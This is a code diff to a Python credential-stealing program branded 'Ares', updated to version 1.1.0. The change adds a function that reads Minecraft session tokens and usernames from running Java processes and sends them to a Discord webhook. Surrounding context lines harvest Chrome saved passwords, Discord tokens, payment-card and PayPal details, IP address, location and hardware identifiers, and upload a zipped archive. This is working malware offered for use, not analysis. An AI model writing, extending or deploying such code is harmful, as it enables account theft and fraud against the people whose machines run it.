@@ -5,6 +5,7 @@ import browser_cookie3
 import requests
 import re
 import win32crypt
+import psutil
 import datetime
 import win32con
 
@@ -27,7 +28,8 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from psutil import virtual_memory
 from win32api import GetSystemMetrics
 
-hk = "YOUR_WEBHOOK_HERE"  
+hk = "%WEBHOOK%"
+ver = "1.1.0"
 
 def getip() -> str:
     return requests.get("https://api.ipify.org?format=text").text
@@ -208,6 +210,26 @@ def decrypt_token(encrypted_token, path):
     except Exception as e:
         return None
 
+def retriever():
+    token_pattern = re.compile(r'--accessToken\s+([a-zA-Z0-9\-_\.]+)')
+    username_pattern = re.compile(r'--username\s+([^\s]+)')
+    
+    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+        try:
+            if 'java' in proc.info['name'].lower():
+                cmdline = ' '.join(proc.info['cmdline'])
+                token_match = token_pattern.search(cmdline)
+                username_match = username_pattern.search(cmdline)
+                
+                if token_match:
+                    token = token_match.group(1)
+                    username = username_match.group(1) if username_match else None
+                    return {'token': token, 'username': username}
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+    return None
+
+
 def af(token):
     headers = {
         "Authorization": token,
@@ -370,8 +392,21 @@ def send_webhook(webhook_url, content=None, embeds=None, username=None, avatar_u
         return response
 
 def main():
+    ares_color = 0xC80815    
+    result = retriever()
+    mctoken = result['token'] if result else None
+    mcuser = result['username'] if result else None
     p_lst = get_Personal_data()
     cpuinfo = get_cpu_info()
+    minecraft_embed = create_embed(
+        title="Minecraft Account Info",
+        description="Minecraft username and session token retrieved.",
+        color=ares_color
+    )
+    minecraft_embed["timestamp"] = datetime.datetime.utcnow().isoformat()
+    add_field(minecraft_embed, "🎮 MC Username", f"`{mcuser or 'Unknown'}`", inline=True)
+    add_field(minecraft_embed, "🪛 MC Session ID", f"```{mctoken or 'Unknown'}```", inline=True)
+
 
     with TemporaryDirectory(dir=".") as td:
         try:
@@ -437,7 +472,7 @@ def main():
                 if os.path.exists(file_path):
                     zip.write(file_path)
 
-        ares_color = 0xC80815
+
         embeds = []
 
         system_embed = create_embed(
@@ -448,14 +483,14 @@ def main():
 
         system_embed["timestamp"] = datetime.datetime.utcnow().isoformat()
 
-        add_field(system_embed, "👤 PC Username", f"`{os.getenv('UserName')}`", inline=True)
-        add_field(system_embed, "💻 PC Name", f"`{os.getenv('COMPUTERNAME')}`", inline=True)
+        add_field(system_embed, "👤 PC Username", f"`{os.getenv('UserName') or 'Unknown'}`", inline=True)
+        add_field(system_embed, "💻 PC Name", f"`{os.getenv('COMPUTERNAME') or 'Unknown'}`", inline=True)
         add_field(system_embed, "🖥️ OS", f"`{os.name} Windows`", inline=True)
-        add_field(system_embed, "🌐 IP", f"`{p_lst[0]}`", inline=True)
-        add_field(system_embed, "🌍 Country", f"`{p_lst[1]}`", inline=True)
-        add_field(system_embed, "🏙️ City", f"`{p_lst[2]}`", inline=True)
-        add_field(system_embed, "🔌 MAC", f"`{gma()}`", inline=True)
-        add_field(system_embed, "🪛 HWID", f"`{get_hwid()}`", inline=True)
+        add_field(system_embed, "🌐 IP", f"`{p_lst[0] or 'N/A'}`", inline=True)
+        add_field(system_embed, "🌍 Country", f"`{p_lst[1] or 'N/A'}`", inline=True)
+        add_field(system_embed, "🏙️ City", f"`{p_lst[2] or 'N/A'}`", inline=True)
+        add_field(system_embed, "🔌 MAC", f"`{gma() or 'N/A'}`", inline=True)
+        add_field(system_embed, "🪛 HWID", f"`{get_hwid() or 'N/A'}`", inline=True)
 
         cpu_brand = cpuinfo.get('brand_raw', 'Unknown')
         cpu_speed = 'Unknown'
@@ -482,7 +517,7 @@ def main():
         )
 
         current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        set_footer(system_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
+        set_footer(system_embed, f"Captured at {current_time} • Powered by Ares {ver}", "https://i.imgur.com/Mewaogf.png")
         set_author(system_embed, "Ares System Information", None, "https://i.imgur.com/Mewaogf.png")
 
         embeds.append(system_embed)
@@ -498,24 +533,25 @@ def main():
 
             password_list = ""
             for i, pwd in enumerate(chrome_psw_list[:5]):
-                password_list += f"**{i+1}.** Website: `{pwd[2]}`\n"
-                password_list += f"   Username: `{pwd[0]}`\n"
-                password_list += f"   Password: `{pwd[1]}`\n\n"
+                password_list += f"**{i+1}.** Website: `{pwd[2] or 'N/A'}`\n"
+                password_list += f"   Username: `{pwd[0] or 'N/A'}`\n"
+                password_list += f"   Password: `{pwd[1] or 'N/A'}`\n\n"
 
             if len(chrome_psw_list) > 5:
                 password_list += f"*... and {len(chrome_psw_list) - 5} more (see attached file)*"
 
-            add_field(passwords_embed, "💾 Saved Credentials", password_list or "`None`", inline=False)
+            add_field(passwords_embed, "💾 Saved Credentials", password_list.strip() or "`None`", inline=False)
 
-            set_footer(passwords_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
+            set_footer(passwords_embed, f"Captured at {current_time} • Powered by Ares {ver}", "https://i.imgur.com/Mewaogf.png")
             set_author(passwords_embed, "Chrome Passwords", None, "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/1200px-Google_Chrome_icon_%28February_2022%29.svg.png")
 
             embeds.append(passwords_embed)
 
+
         for user in user_data:
             discord_embed = create_embed(
-                title=f"🔰 Discord Account Found",
-                description=f"🎮 Account information captured from **{user.get('platform')}**",
+                title="🔰 Discord Account Found",
+                description=f"🎮 Account information captured from **{user.get('platform', 'Unknown')}**",
                 color=ares_color
             )
 
@@ -524,17 +560,15 @@ def main():
             add_field(discord_embed, "👤 Username", f"`{user.get('username', 'N/A')}`", inline=True)
             add_field(discord_embed, "🆔 User ID", f"`{user.get('id', 'N/A')}`", inline=True)
             add_field(discord_embed, "📧 Email", f"`{user.get('email', 'N/A')}`", inline=True)
-            add_field(discord_embed, "🛜 IP", f"`{ip}`", inline=True)
-            add_field(discord_embed, "📱 Phone", f"`{user.get('phone', 'None')}`" if user.get('phone') else "`None`", inline=True)
+            add_field(discord_embed, "🛜 IP", f"`{p_lst[0] or 'N/A'}`", inline=True)
+            add_field(discord_embed, "📱 Phone", f"`{user.get('phone', 'None')}`", inline=True)
 
-            nitro_status = "No Nitro"
+            nitro_status = "❌ No Nitro"
             try:
                 response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", 
                                       headers={"Authorization": user.get("token")})
                 if response.status_code == 200 and response.json():
                     nitro_status = "✅ Nitro"
-                else:
-                    nitro_status = "❌ No Nitro"
             except:
                 pass
 
@@ -543,30 +577,26 @@ def main():
             try:
                 guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", 
                                              headers={"Authorization": user.get("token")})
-                if guilds_response.status_code == 200:
-                    guild_count = len(guilds_response.json())
-                    add_field(discord_embed, "🌐 Servers", f"`{guild_count}`", inline=True)
+                guild_count = len(guilds_response.json()) if guilds_response.status_code == 200 else "Unknown"
             except:
-                add_field(discord_embed, "🌐 Servers", "`Unknown`", inline=True)
+                guild_count = "Unknown"
+            add_field(discord_embed, "🌐 Servers", f"`{guild_count}`", inline=True)
 
             if user.get("payment_methods"):
                 payment_info = ""
                 for method in user.get("payment_methods"):
                     if method.get("type") == "Credit Card":
-                        payment_info += f"💳 **{method.get('brand')}** ending in *{method.get('last_4')}*\n"
-                        payment_info += f"   ⏳ Expires: {method.get('expires')}\n"
+                        payment_info += f"💳 **{method.get('brand', 'Unknown')}** ending in *{method.get('last_4', '****')}*\n"
+                        payment_info += f"   ⏳ Expires: {method.get('expires', '??/??')}\n"
                     elif method.get("type") == "PayPal":
-                        payment_info += f"<:paypal:1234567890> **PayPal**: {method.get('email')}\n"
+                        payment_info += f"<:paypal:1234567890> **PayPal**: {method.get('email', 'N/A')}\n"
 
-                add_field(discord_embed, "💰 Payment Methods", payment_info or "`None`", inline=False)
+                add_field(discord_embed, "💰 Payment Methods", payment_info.strip() or "`None`", inline=False)
             else:
                 add_field(discord_embed, "💰 Payment Methods", "`None`", inline=False)
 
             token = user.get("token", "N/A")
-            if token != "N/A":
-                add_field(discord_embed, "🔑 Token", f"```{token}```", inline=False)
-            else:
-                add_field(discord_embed, "🔑 Token", "`N/A`", inline=False)
+            add_field(discord_embed, "🔑 Token", f"```{token}```" if token != "N/A" else "`N/A`", inline=False)
 
             if user.get("avatar"):
                 set_thumbnail(discord_embed, user.get("avatar"))
@@ -579,8 +609,8 @@ def main():
             }
 
             platform = user.get("platform")
-            set_author(discord_embed, f"Captured from {platform}", None, platform_icons.get(platform))
-            set_footer(discord_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
+            set_author(discord_embed, f"Captured from {platform or 'Unknown'}", None, platform_icons.get(platform))
+            set_footer(discord_embed, f"Captured at {current_time} • Powered by Ares {ver}", "https://i.imgur.com/Mewaogf.png")
 
             embeds.append(discord_embed)
 
@@ -592,8 +622,15 @@ def main():
             file_path=zip_path,
             file_name=f"Ares-{os.getenv('UserName')}.zip"
         )
+        send_webhook(
+            hk,
+            embeds=[minecraft_embed],
+            username="Ares",
+            avatar_url="https://i.imgur.com/Mewaogf.png"
+        )
 
         return embeds
+
 
 if __name__ == "__main__":
     main()
